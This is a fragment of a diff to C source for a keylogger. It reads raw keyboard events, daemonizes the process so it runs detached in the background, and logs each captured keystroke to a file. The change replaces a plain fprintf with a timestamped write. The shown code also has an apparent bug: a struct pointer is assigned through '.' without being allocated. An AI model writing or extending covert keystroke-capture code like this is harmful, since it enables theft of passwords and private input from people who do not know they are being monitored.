@@ -223,7 +223,7 @@ void* start_keylogging(int kb_fd, FILE *log_file){
     int shift_pressed=0; //If shift engaged, shift_pressed = 1
     
     struct loginfo *info;
-    
+    info.file = log_file;
     
     /*Daemonize process by redirecting stdin and stdout to /dev/null*/
     if (daemon(1, 0) == -1) {
@@ -240,8 +240,7 @@ void* start_keylogging(int kb_fd, FILE *log_file){
             }
             char *name = get_key_text(event.code, shift_pressed);
             if (strcmp(name, "\0") != 0) {
-                /***TODO - change this to timestamped_write**/
-                fprintf(log_file, "%s",name);
+                timestamped_write(info, name);
             }
         } else if (event.value == KEY_RELEASE) {
             if (is_shift(event.code)) {
